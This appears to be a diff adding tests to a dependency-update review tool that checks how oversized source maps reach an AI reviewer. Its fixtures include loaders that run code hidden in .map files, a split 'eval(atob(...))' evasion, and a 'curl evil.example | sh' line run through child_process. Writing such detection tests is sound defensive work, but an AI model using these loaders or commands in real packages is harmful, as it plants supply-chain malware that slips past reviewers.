@@ -204,3 +204,120 @@ describe("everything else is shown in full", () => {
     expect(added({ "a.js.map": mapOf("AAAA", { names: ["marker_name"], x_google_ignoreList: { payload: "marker_payload" } }) })).toContain("marker_payload");
   });
 });
+
+describe("a strict source map over the pre-pass size limit", () => {
+  // 5.2 MB of base64 VLQ-looking mappings: the pre-pass does not scan it ("large-file"), and a model that is shown it flags it as obfuscation.
+  const hugeMap = (seed: string) => mapOf(("AAAA" + seed + "CAAO,aAAP,OAAO,uBAAP;").repeat(250_000));
+  const rel = (seed: string, code: string) => files({ "package.json": pj({ version: seed, main: "lib/index.js" }), "lib/index.js": code, "lib/index.js.map": hugeMap(seed) });
+  const go = (scanner?: { name: string; scan: (eco: string, f: FileMap) => Promise<{ rule: string; path: string; detail: string }[]> }) => {
+    const reviewed: string[] = [];
+    return run2(rel("a", "exports.v = 1;\n"), rel("b", "exports.v = 2;\n"), reviewed, scanner).then((r) => ({ r, reviewed }));
+  };
+  const run2 = (old: FileMap, now: FileMap, reviewed: string[], scanner?: { name: string; scan: (eco: string, f: FileMap) => Promise<{ rule: string; path: string; detail: string }[]> }) =>
+    reviewUpdate({
+      eco: "npm", name: "lib", from: "1.0.0", to: "1.0.1",
+      registry: { latest: async () => undefined, publishedAt: async () => new Date("2020-01-01"), artifactUrls: async () => [] },
+      advisories: { query: async () => [] },
+      reviewer: { name: "fake", review: async (p) => (reviewed.push(p), "APPROVE\nno attack indicators found") },
+      scanner, cooldownDays: 1, now: new Date("2026-10-21T00:00:00Z"), loadArtifacts: async () => ({ old, new: now }), chunkChars: 60000,
+    });
+  test("the large-file signal alone does not show it in full: it is a hash line and the review lands", async () => {
+    const { r, reviewed } = await go();
+    expect(r.prepass?.soft.some((s) => s.kind === "large-file" && s.path === "lib/index.js.map")).toBe(true);
+    expect(reviewed.join("")).not.toContain("CAAO,aAAP,OAAO");
+    expect(reviewed.join("")).toContain("sourcesContent");
+    expect(r.layers.find((l) => l.layer === "reviewer")).toMatchObject({ verdict: "pass" });
+    expect(r.decision).toBe("land");
+  });
+  test("another signal on it (a scanner hit) still shows it in full", async () => {
+    const { reviewed } = await go({ name: "stub", scan: async (_e, f) => (new TextDecoder().decode(f.get("lib/index.js") ?? new Uint8Array()).includes("v = 2") ? [{ rule: "obfuscated", path: "lib/index.js.map", detail: "x" }] : []) }); // a finding new in this release
+    expect(reviewed.join("")).toContain("CAAO,aAAP,OAAO");
+  });
+});
+
+describe("a padded strict map: its own strings are checked before the size signal is dropped", () => {
+  const pad = "AAAA,AAAA;".repeat(520_000); // mappings text over the 5 MB pre-pass limit, in the short segments of a real map
+  const loader = "const m = JSON.parse(require('fs').readFileSync(__filename + '.map', 'utf8'));\nrequire('vm').runInThisContext(m.names.join(''));\n";
+  const mapWith = (extra: object) => JSON.stringify({ version: 3, file: "index.js", sources: ["../src/index.ts"], names: [], mappings: pad, ...extra });
+  const rel = (seed: string, map: string, code: string, extra: Record<string, string> = {}) => files({ "package.json": pj({ version: seed, main: "lib/index.js" }), "lib/index.js": code, "lib/index.js.map": map, ...extra });
+  const seen = async (map: string, code: string, extra: Record<string, string> = {}) => {
+    const reviewed: string[] = [];
+    await reviewUpdate({
+      eco: "npm", name: "lib", from: "1.0.0", to: "1.0.1",
+      registry: { latest: async () => undefined, publishedAt: async () => new Date("2020-01-01"), artifactUrls: async () => [] },
+      advisories: { query: async () => [] },
+      reviewer: { name: "fake", review: async (p) => (reviewed.push(p), "APPROVE\nno attack indicators found") },
+      cooldownDays: 1, now: new Date("2026-10-21T00:00:00Z"), chunkChars: 200_000,
+      loadArtifacts: async () => ({ old: rel("a", mapWith({ names: ["x"] }), "exports.v = 1;\n"), new: rel("b", map, code, extra) }),
+    });
+    return reviewed.join("");
+  };
+  const HASH = "[source map, strict v3 data";
+  // "eval(atob('x'))" split over names so no single name matches, and in sourcesContent as new Function(...)
+  const inNames = mapWith({ names: ["ev", "al(at", "ob('x'))"] });
+  const inContent = mapWith({ sourcesContent: ["const f = new Function('return 1');"] });
+  for (const [what, map] of [["names", inNames], ["sourcesContent", inContent]] as [string, string][])
+    for (const [how, code] of [["without a loader", "exports.v = 2;\n"], ["with a __filename + '.map' loader", loader]] as [string, string][])
+      test(`a payload in ${what} ${how} is shown`, async () => {
+        const text = await seen(map, code);
+        expect(text).toContain(what === "names" ? "al(at" : "Function('return");
+        // a loader that quotes ".map" names the map: it is not hashed at all, so its text is shown with the rest
+        if (how === "without a loader") { expect(text).toContain(HASH); expect(text).not.toContain("AAAA,AAAA;AAAA"); }
+      });
+  test("clean names and sourcesContent stay a hash line", async () => {
+    const text = await seen(mapWith({ names: ["alpha", "beta"], sourcesContent: ["export const x = 1;"] }), "exports.v = 2;\n");
+    expect(text).toContain(HASH);
+    expect(text).not.toContain("AAAA,AAAA;AAAA");
+  });
+  test("source code in sourcesContent that mentions child_process is shown as source, beside the mappings hash line, as a small map would show it", async () => {
+    const map = mapWith({ sources: ["../src/run.ts"], sourcesContent: ["import { execSync } from 'child_process';\nexecSync('id');"] });
+    const text = await seen(map, "exports.v = 2;\n");
+    expect(text).toContain(HASH);
+    expect(text).toContain("execSync('id');");
+    expect(text).toContain("../src/run.ts");
+    expect(text).not.toContain("AAAA,AAAA;AAAA");
+  });
+  const loaders: [string, string][] = [
+    ["__filename.replace(/js$/, 'js.map')", "const m = JSON.parse(require('fs').readFileSync(__filename.replace(/js$/, 'js.map'), 'utf8'));\nrequire('vm').runInThisContext(Object.values(m).pop()[0]);\n"],
+    ["__filename + String.fromCharCode(46) + 'map'", "const m = JSON.parse(require('fs').readFileSync(__filename + String.fromCharCode(46) + 'map', 'utf8'));\nrequire('vm').runInThisContext(Object.values(m).pop()[0]);\n"],
+    ["readdirSync(__dirname).find(f => f.endsWith('map'))", "const fs = require('fs');\nconst f = fs.readdirSync(__dirname).find((f) => f.endsWith('map'));\nrequire('vm').runInThisContext(JSON.parse(fs.readFileSync(__dirname + '/' + f, 'utf8')).sourcesContent[0]);\n"],
+  ];
+  for (const [name, code] of loaders)
+    test(`a child_process-only payload in sourcesContent read by a loader that builds the name with ${name} is shown in full`, async () => {
+      const text = await seen(mapWith({ sources: ["../src/p.ts"], sourcesContent: ["require('child_process').execSync('curl evil.example | sh');"] }), code);
+      // shown either as source beside the hash line or inside the whole map, whose long strings the minified-line diff splits into tokens
+      expect(text).toContain("child_process");
+      expect(text).toContain("evil.example");
+    });
+  test("a segment over 64 characters in the mappings of a padded map shows the map as a small map is shown", async () => {
+    const payload = "A".repeat(100) + "ZXZhbChhdG9iKCdYWFhY".repeat(40);
+    const text = await seen(JSON.stringify({ version: 3, file: "index.js", sources: ["../src/index.ts"], names: [], mappings: pad + payload }), "exports.v = 2;\n");
+    expect(text).not.toContain(HASH);
+  });
+  const bareLoaders: [string, string][] = [
+    ["template literal text", "const m = JSON.parse(require('fs').readFileSync(`${__filename}.map`, 'utf8'));\nrequire('vm').runInThisContext(m.names.join(''));\n"],
+    ["a regex literal source", "const f = require('fs').readdirSync(__dirname).find((x) => /\\.map$/.test(x));\nconst m = JSON.parse(require('fs').readFileSync(__dirname + '/' + f, 'utf8'));\nrequire('vm').runInThisContext(m.names.join(''));\n"],
+    ["a folded concatenation", "const m = JSON.parse(require('fs').readFileSync(__filename + '.m' + 'ap', 'utf8'));\nrequire('vm').runInThisContext(m.names.join(''));\n"],
+    ["a comment beside a real string", "// emits the .map file\nconst m = JSON.parse(require('fs').readFileSync(__filename + '.map', 'utf8'));\nrequire('vm').runInThisContext(m.names.join(''));\n"],
+  ];
+  for (const [name, code] of bareLoaders)
+    test(`a bare .map from ${name} still names every map: the padded map is not hashed`, async () => {
+      expect(await seen(mapWith({ names: ["alpha"] }), code)).not.toContain(HASH);
+    });
+  test("a quoted .map inside a JS comment is not a loader: the padded map stays a hash line", async () => {
+    const out = await seen(mapWith({ names: ["alpha"] }), "// reads index.js + \".map\" and '.map'\nexports.v = 2;\n");
+    expect(out).toContain(HASH);
+    expect(out).not.toContain("AAAA,AAAA;AAAA");
+  });
+  test("a .map token in a comment or prose is not a loader: the padded map stays a hash line", async () => {
+    for (const [file, text] of [["lib/util.js", "// emits the .map file next to the bundle\nexports.v = 2;\n"], ["README.md", "Writes a .map file.\n"]] as const) {
+      const out = await seen(mapWith({ names: ["alpha"] }), "exports.v = 2;\n", { [file]: text });
+      expect(out).toContain(HASH);
+      expect(out).not.toContain("AAAA,AAAA;AAAA");
+    }
+  });
+  test("a loader that builds the name at run time (the bare .map string) names every map", async () => {
+    const text = await seen(mapWith({ names: ["alpha"] }), loader);
+    expect(text).not.toContain(HASH);
+  });
+});
